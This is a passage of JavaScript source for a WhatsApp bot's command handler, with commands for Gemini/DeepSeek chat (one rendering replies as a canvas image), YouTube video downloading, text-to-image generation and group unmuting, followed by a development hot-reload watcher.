        response = response.replace(/\\n/g, '\n').replace(/\\"/g, '"').trim();
        response = response.replace(/\[object Object\]/g, '').trim();

        if (response.length > 4000) {
            response = response.substring(0, 3900) + '\n\n... (truncated)';
        }

        // ── Save chat history (optional) ──
        sessionData[sender].history.push({ user: text, bot: response });
        if (sessionData[sender].history.length > 20) {
            sessionData[sender].history.shift();
        }
        saveJSON(sessionPath, sessionData);

        await mzazireply(`🧠 *${usedApi}:*\n${response}`);

    } catch (err) {
        logger.error("Gemini error:", err);
        if (err.code === "ECONNABORTED") {
            mzazireply("⏳ Request timed out. Please try again.");
        } else if (err.code === "ENOTFOUND") {
            mzazireply("❌ AI service is currently down. Please try again later.");
        } else if (err.response?.status === 500) {
            mzazireply("⚠️ The Gemini service is temporarily unavailable (server error). Please try again later.");
        } else {
            mzazireply(`❌ Error: ${err.message || "Failed to get response."}`);
        }
    }
    break;
}
case "gemini2": {
    if (!text) {
        return mzazireply(
            `🧠 *Gemini AI Chat*\n\n` +
            `Usage: ${prefix}gemini <question>\n` +
            `Example: ${prefix}gemini explain quantum physics\n\n` +
            `📌 Type "${prefix}gemini reset" to reset conversation history.`
        );
    }

    // ── Reset conversation ──
    if (text.toLowerCase() === "reset") {
        const sessionPath = `./database/sessions/${botPhoneNum}/gemini_session.json`;
        const sessionData = loadJSON(sessionPath, {});
        delete sessionData[sender];
        saveJSON(sessionPath, sessionData);
        return mzazireply("✅ Gemini conversation history has been reset!");
    }

    try {
        const query = encodeURIComponent(text.trim());
        let response = null;
        let usedApi = "Gemini";

        // ── Get or create session ID for this user ──
        const sessionPath = `./database/sessions/${botPhoneNum}/gemini_session.json`;
        const sessionData = loadJSON(sessionPath, {});
        
        if (!sessionData[sender]) {
            sessionData[sender] = {
                sessionId: crypto.randomUUID ? crypto.randomUUID() : require('node:crypto').randomUUID(),
                history: []
            };
            saveJSON(sessionPath, sessionData);
        }

        const sessionId = sessionData[sender].sessionId;

        // ── Try Gemini API ──
        try {
            const apiUrl = `https://api.drexapp.space/ai/gemini?q=${query}&session=${sessionId}`;
            const { data } = await axios.get(apiUrl, { timeout: 20000 });

            if (data) {
                if (data.result?.response) {
                    response = data.result.response;
                } else if (data.result && typeof data.result === 'string') {
                    response = data.result;
                } else if (data.response && typeof data.response === 'string') {
                    response = data.response;
                } else if (data.message && typeof data.message === 'string') {
                    response = data.message;
                } else if (typeof data === 'string') {
                    response = data;
                } else {
                    const jsonStr = JSON.stringify(data);
                    const match = jsonStr.match(/"response":"([^"]*)"/);
                    if (match) {
                        response = match[1].replace(/\\n/g, '\n').replace(/\\"/g, '"');
                    }
                }
            }
        } catch (err) {
            logger.info("Gemini API failed:", err.message);
            // ── Fallback to DeepSeek ──
            try {
                const fallbackUrl = `https://api.drexapp.space/ai/deepseek?q=${query}`;
                const { data: fallbackData } = await axios.get(fallbackUrl, { timeout: 15000 });
                if (fallbackData?.result?.response) {
                    response = fallbackData.result.response;
                    usedApi = "DeepSeek";
                }
            } catch (fallbackErr) {
                logger.info("DeepSeek fallback failed:", fallbackErr.message);
            }
        }

        if (!response) {
            return mzazireply("❌ AI service is currently unavailable. Please try again later.");
        }

        // ── Clean up response ──
        response = response.replace(/\\n/g, '\n').replace(/\\"/g, '"').trim();
        response = response.replace(/\[object Object\]/g, '').trim();

        // ── Save chat history ──
        sessionData[sender].history.push({ user: text, bot: response });
        if (sessionData[sender].history.length > 20) {
            sessionData[sender].history.shift();
        }
        saveJSON(sessionPath, sessionData);

        // ──────────────────────────────────────────────────────────────
        // ── CREATE CANVAS IMAGE ──
        // ──────────────────────────────────────────────────────────────
        const { createCanvas } = require('canvas');
        const W = 800;
        let H = 500; // Will be adjusted based on text length

        // Wrap text helper
        function wrapText(ctx, text, maxWidth) {
            const words = text.split(' ');
            const lines = [];
            let currentLine = '';
            
            for (const word of words) {
                const testLine = currentLine + word + ' ';
                const metrics = ctx.measureText(testLine);
                if (metrics.width > maxWidth && currentLine.length > 0) {
                    lines.push(currentLine.trim());
                    currentLine = word + ' ';
                } else {
                    currentLine = testLine;
                }
            }
            if (currentLine.length > 0) lines.push(currentLine.trim());
            return lines;
        }

        // Calculate required height
        const tempCanvas = createCanvas(W, 100);
        const tempCtx = tempCanvas.getContext('2d');
        tempCtx.font = '16px Arial';
        
        const maxWidth = W - 60;
        const answerLines = wrapText(tempCtx, response, maxWidth);
        const questionLines = wrapText(tempCtx, text, maxWidth);
        
        // Base height: header + question + padding + answer
        let baseHeight = 120 + (questionLines.length * 28) + 40 + (answerLines.length * 28) + 50;
        H = Math.max(450, baseHeight);

        // ── Create final canvas ──
        const canvas = createCanvas(W, H);
        const ctx = canvas.getContext('2d');

        // ── Background gradient ──
        const gradient = ctx.createLinearGradient(0, 0, W, H);
        gradient.addColorStop(0, '#0d0d2b');
        gradient.addColorStop(0.5, '#1a1a3e');
        gradient.addColorStop(1, '#0d0d2b');
        ctx.fillStyle = gradient;
        ctx.fillRect(0, 0, W, H);

        // ── Border glow ──
        ctx.shadowColor = '#4f46e5';
        ctx.shadowBlur = 30;
        ctx.strokeStyle = '#4f46e5';
        ctx.lineWidth = 2;
        ctx.strokeRect(10, 10, W - 20, H - 20);
        ctx.shadowBlur = 0;

        // ── Top bar (Gemini theme) ──
        const headerGrad = ctx.createLinearGradient(0, 0, W, 0);
        headerGrad.addColorStop(0, '#4f46e5');
        headerGrad.addColorStop(0.5, '#7c3aed');
        headerGrad.addColorStop(1, '#4f46e5');
        ctx.fillStyle = headerGrad;
        ctx.fillRect(20, 20, W - 40, 45);

        // ── Header text ──
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 20px Arial';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText(`🧠 GEMINI AI`, W / 2, 43);

        // ── Question section ──
        let yPos = 85;
        ctx.fillStyle = '#94a3b8';
        ctx.font = '14px Arial';
        ctx.textAlign = 'left';
        ctx.textBaseline = 'top';
        ctx.fillText(`📝 Your Question:`, 30, yPos);
        yPos += 22;

        ctx.fillStyle = '#e2e8f0';
        ctx.font = '16px Arial';
        for (const line of questionLines) {
            ctx.fillText(line, 30, yPos);
            yPos += 28;
        }

        // ── Divider ──
        yPos += 10;
        ctx.strokeStyle = 'rgba(255,255,255,0.08)';
        ctx.lineWidth = 1;
        ctx.setLineDash([5, 5]);
        ctx.beginPath();
        ctx.moveTo(30, yPos);
        ctx.lineTo(W - 30, yPos);
        ctx.stroke();
        ctx.setLineDash([]);
        yPos += 25;

        // ── Answer section ──
        ctx.fillStyle = '#4ade80';
        ctx.font = 'bold 14px Arial';
        ctx.textAlign = 'left';
        ctx.textBaseline = 'top';
        ctx.fillText(`🤖 AI Response (${usedApi}):`, 30, yPos);
        yPos += 24;

        ctx.fillStyle = '#f1f5f9';
        ctx.font = '16px Arial';
        ctx.textAlign = 'left';
        ctx.textBaseline = 'top';
        for (const line of answerLines) {
            ctx.fillText(line, 30, yPos);
            yPos += 28;
        }

        // ── Footer ──
        ctx.fillStyle = 'rgba(255,255,255,0.15)';
        ctx.font = '11px Arial';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'bottom';
        ctx.fillText(`© ${botName} • Gemini AI • ${new Date().toLocaleString()}`, W / 2, H - 12);

        // ── Convert to buffer and send ──
        const buffer = canvas.toBuffer('image/png');

        await mzazi.sendMessage(sender, {
            image: buffer,
            caption: `🧠 *Gemini AI Response*\n\n📝 *Question:* ${text.substring(0, 60)}${text.length > 60 ? '...' : ''}\n\n💡 Check the image above for the full response.`,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363425539800408@newsletter",
                    newsletterName: botName.toUpperCase(),
                    serverMessageId: 143
                }
            }
        });

    } catch (err) {
        logger.error("Gemini error:", err);
        
        // ── Fallback: send as text if Canvas fails ──
        if (err.message?.includes('canvas') || err.message?.includes('Canvas')) {
            try {
                const sessionData2 = loadJSON(`./database/sessions/${botPhoneNum}/gemini_session.json`, {});
                const lastResponse = sessionData2[sender]?.history?.slice(-1)[0]?.bot;
                if (lastResponse) {
                    await mzazireply(`🧠 *Gemini AI:*\n${lastResponse}`);
                    return;
                }
            } catch (e) {}
        }
        
        if (err.code === "ECONNABORTED") {
            mzazireply("⏳ Request timed out. Please try again.");
        } else if (err.code === "ENOTFOUND") {
            mzazireply("❌ AI service is currently down. Please try again later.");
        } else if (err.response?.status === 500) {
            mzazireply("⚠️ The Gemini service is temporarily unavailable. Please try again later.");
        } else {
            mzazireply(`❌ Error: ${err.message || "Failed to get response."}`);
        }
    }
    break;
}
case "video":
case "ytvideo":
case "downloadvideo": {
    if (!text) return mzazireply("🎵 *Example:*\n.video faded\n.video Alan Walker - Faded");

    try {
        await mzazireply("🔍 Searching for video... Please wait.");

        const yts = require('yt-search');
        const ytdl = require('@distube/ytdl-core'); // More reliable than ytdl-core

        // ── Search for video ──
        const search = await yts(text);
        const video = search.videos[0];
        
        if (!video) {
            return mzazireply("❌ No video found. Try a different search.");
        }

        const title = video.title || "Unknown";
        const thumbnail = video.thumbnail || null;
        const duration = video.duration || "N/A";
        const videoUrl = video.url;

        // ── Send video info ──
        const caption = `🎥 *Video Found*\n\n` +
            `📌 *Title:* ${title}\n` +
            `⏱ *Duration:* ${duration}\n` +
            `📥 *Sending video...*`;

        if (thumbnail) {
            await mzazi.sendMessage(sender, {
                image: { url: thumbnail },
                caption: caption,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363425539800408@newsletter",
                        newsletterName: botName.toUpperCase(),
                        serverMessageId: 143
                    }
                }
            });
        } else {
            await mzazireply(caption);
        }

        // ── Download video using @distube/ytdl-core ──
        try {
            // Get video info with cookie support
            const info = await ytdl.getInfo(videoUrl, {
                requestOptions: {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    }
                }
            });

            // Choose best quality format
            const format = ytdl.chooseFormat(info, { 
                quality: 'highest',
                filter: 'audioandvideo'
            });

            if (!format || !format.url) {
                throw new Error("No suitable format found");
            }

            // Download video as buffer
            const videoBuffer = await new Promise((resolve, reject) => {
                const stream = ytdl(videoUrl, {
                    quality: 'highest',
                    filter: 'audioandvideo',
                    requestOptions: {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    }
                });
                
                const chunks = [];
                stream.on('data', chunk => chunks.push(chunk));
                stream.on('end', () => resolve(Buffer.concat(chunks)));
                stream.on('error', reject);
            });

            if (!videoBuffer || videoBuffer.length === 0) {
                throw new Error("Empty video buffer");
            }

            // ── Send video ──
            await mzazi.sendMessage(sender, {
                video: videoBuffer,
                caption: `🎬 *${title}*\n⏱ Duration: ${duration}`,
                mimetype: "video/mp4",
                fileName: `${title.replace(/[^a-zA-Z0-9 ]/g, '')}.mp4`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363425539800408@newsletter",
                        newsletterName: botName.toUpperCase(),
                        serverMessageId: 143
                    }
                }
            });

            await mzazireply(`✅ *${title}* sent successfully!`);

        } catch (downloadErr) {
            logger.error("Download error:", downloadErr);
            
            // ── Fallback: Use API with proxy ──
            try {
                const apiUrl = `https://api.drexapp.space/downloader/videov2?q=${encodeURIComponent(text)}`;
                const response = await axios.get(apiUrl, { timeout: 20000 });
                const res = response.data?.result;
                
                if (res?.best?.url) {
                    const videoUrl2 = res.best.url;
                    
                    // Download via proxy
                    const proxyResponse = await axios.get(videoUrl2, {
                        responseType: 'arraybuffer',
                        timeout: 120000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': 'video/mp4,*/*;q=0.8',
                            'Range': 'bytes=0-'
                        }
                    });
                    
                    if (proxyResponse.data && proxyResponse.data.length > 0) {
                        const videoBuffer2 = Buffer.from(proxyResponse.data);
                        
                        await mzazi.sendMessage(sender, {
                            video: videoBuffer2,
                            caption: `🎬 *${res.title || title}*\n⏱ Duration: ${res.duration || duration}`,
                            mimetype: "video/mp4",
                            fileName: `${(res.title || title).replace(/[^a-zA-Z0-9 ]/g, '')}.mp4`,
                            contextInfo: {
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "120363425539800408@newsletter",
                                    newsletterName: botName.toUpperCase(),
                                    serverMessageId: 143
                                }
                            }
                        });
                        
                        await mzazireply(`✅ *${res.title || title}* sent successfully!`);
                        break;
                    }
                }
                throw new Error("API fallback failed");
            } catch (fallbackErr) {
                logger.error("Fallback error:", fallbackErr);
                return mzazireply("❌ Failed to download video. Please try again later.");
            }
        }

    } catch (err) {
        logger.error("Video download error:", err);
        mzazireply(`❌ Error: ${err.message || "Failed to download video."}`);
    }
    break;
}
case "ttp":
case "texttoimage":
case "textimage": {
    if (!text) {
        return mzazireply(
            `🖼️ *Text to Image*\n\n` +
            `Usage: ${prefix}ttp <text>\n` +
            `Example: ${prefix}ttp Hello World\n\n` +
            `Converts your text into a stylish image.`
        );
    }

    try {
        await mzazireply(`🖼️ Generating image for "${text}"...`);

        const query = encodeURIComponent(text.trim());
        let imageUrl = null;
        let imageBuffer = null;

        // ── Try DrexApp TTP API ──
        try {
            const apiUrl = `https://api.drexapp.space/tools/ttp?text=${query}`;
            const response = await axios.get(apiUrl, { timeout: 15000 });
            
            logger.info("TTP API Response:", JSON.stringify(response.data, null, 2));
            
            // ── Check various response formats ──
            if (response.data) {
                // Check if data has result
                if (response.data.result) {
                    const result = response.data.result;
                    if (typeof result === 'string') {
                        imageUrl = result;
                    } else if (typeof result === 'object' && result !== null) {
                        imageUrl = result.url || result.link || result.image || result.download || result.data;
                    }
                }
                
                // Check direct image/url keys
                if (!imageUrl && response.data.image) {
                    imageUrl = response.data.image;
                }
                if (!imageUrl && response.data.url) {
                    imageUrl = response.data.url;
                }
                if (!imageUrl && response.data.data) {
                    imageUrl = response.data.data;
                }
                if (!imageUrl && response.data.link) {
                    imageUrl = response.data.link;
                }
                
                // If status is true and result is an object with data
                if (!imageUrl && response.data.status === true && typeof response.data.result === 'object') {
                    const values = Object.values(response.data.result);
                    for (const val of values) {
                        if (typeof val === 'string' && (val.startsWith('http') || val.startsWith('/'))) {
                            imageUrl = val;
                            break;
                        }
                    }
                }
            }
        } catch (err) {
            logger.info("DrexApp TTP failed:", err.message);
        }

        // ── Try alternative API ──
        if (!imageUrl) {
            try {
                const fallbackUrl = `https://api.drexapp.space/tools/ttpv2?text=${query}`;
                const response = await axios.get(fallbackUrl, { timeout: 15000 });
                logger.info("TTPv2 API Response:", JSON.stringify(response.data, null, 2));
                
                if (response.data) {
                    if (response.data.result) {
                        const result = response.data.result;
                        if (typeof result === 'string') {
                            imageUrl = result;
                        } else if (typeof result === 'object' && result !== null) {
                            imageUrl = result.url || result.link || result.image || result.data;
                        }
                    }
                    if (!imageUrl && response.data.image) imageUrl = response.data.image;
                    if (!imageUrl && response.data.url) imageUrl = response.data.url;
                    if (!imageUrl && response.data.data) imageUrl = response.data.data;
                }
            } catch (fallbackErr) {
                logger.info("DrexApp TTPv2 failed:", fallbackErr.message);
            }
        }

        // ── If we got a URL, try to download it as buffer ──
        if (imageUrl) {
            // Ensure URL is a string
            if (typeof imageUrl === 'object' && imageUrl !== null) {
                imageUrl = imageUrl.url || imageUrl.link || imageUrl.image || String(Object.values(imageUrl)[0]);
            }
            imageUrl = String(imageUrl);
            
            // If URL is relative, prepend domain
            if (imageUrl.startsWith('/')) {
                imageUrl = `https://api.drexapp.space${imageUrl}`;
            }
            
            // Validate URL
            if (imageUrl.startsWith('http')) {
                try {
                    // Download the image as buffer
                    const imgResponse = await axios.get(imageUrl, {
                        responseType: 'arraybuffer',
                        timeout: 15000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });
                    
                    if (imgResponse.data && imgResponse.data.length > 0) {
                        imageBuffer = Buffer.from(imgResponse.data);
                    }
                } catch (downloadErr) {
                    logger.info("Image download failed:", downloadErr.message);
                }
            }
        }

        // ── If we have a buffer, send it ──
        if (imageBuffer && imageBuffer.length > 0) {
            await mzazi.sendMessage(sender, {
                image: imageBuffer,
                caption: `🖼️ *Text to Image*\n📝 Text: ${text}`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363425539800408@newsletter",
                        newsletterName: botName.toUpperCase(),
                        serverMessageId: 143
                    }
                }
            });

            await mzazireply("✅ Image generated successfully!");
        } else {
            // ── If no image, show error with debug info ──
            return mzazireply(
                `❌ Failed to generate image.\n\n` +
                `The API returned an invalid response. Please try again later.\n\n` +
                `💡 Tip: Try a shorter text or different wording.`
            );
        }

    } catch (err) {
        logger.error("TTP error:", err);
        
        if (err.code === "ECONNABORTED") {
            mzazireply("⏳ Request timed out. Please try again.");
        } else if (err.response?.status === 500) {
            mzazireply("⚠️ The text-to-image service is temporarily unavailable. Please try again later.");
        } else {
            mzazireply(`❌ Error: ${err.message || "Failed to generate image."}`);
        }
    }
    break;
}










      case "unmute2": { 
        if (!isGroup) return mzazireply("❌ Group only!"); 
        const unmTarget = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; 
        if (!unmTarget) return mzazireply(`Usage: ${prefix}unmute2 @user`); 
        setGroupSetting(`${sender}_muted_${unmTarget}`, "muted", false); 
        mzazireply(`🔊 @${jidToNumber(unmTarget)} has been unmuted!`); 
        break; 
      }

      // ── Add more cases here ──
      // case "example": { ... break; }

      default: {
        // Optional: handle unknown commands
        // mzazireply(`❌ Unknown command: ${command}`);
        break;
      }
    }

  } catch (error) {
    logger.error('WhatsApp message handler error:', error);
    try {
      await mzazi.sendMessage(sender, { text: '❌ An error occurred while processing your command.' });
    } catch (e) {}
  }
};

// ── Group event handlers ──────────────────────────────────────────────────────

// ── Exports ──────────────────────────────────────────────────────────────────


// ── Auto-reload (without restarting server) ──────────────────────────────
// ── At the top of case.js ──────────────────────────────────────────────────
// ── Your case handler ──────────────────────────────────────────────────────
// ... all your existing case code ...

// ── Auto-reload (FIXED) ──────────────────────────────────────────────────
let file = require.resolve(__filename);

// Only watch in development - prevents Pterodactyl restart
if (process.env.NODE_ENV !== 'production') {
  fs.watchFile(file, { interval: 1000 }, () => {
    fs.unwatchFile(file);
    
    // FIXED: Use logSystem instead of logger.info
    logSystem(`🔄 Reloading ${__filename}...`, 'info');
    
    try {
      // Clear cache and reload
      delete require.cache[file];
      const updated = require(file);
      
      // Update exports with new module
      Object.assign(module.exports, updated);
      
      logSystem(`✅ ${__filename} reloaded successfully!`, 'success');
    } catch (error) {
      logSystem(`❌ Reload failed: ${error.message}`, 'error');
    }
  });
}

// ── Exports ──────────────────────────────────────────────────────────────────
module.exports.handleGroupParticipantsUpdate = handleGroupParticipantsUpdate;
module.exports.handleGroupsUpdateEvent = handleGroupsUpdateEvent;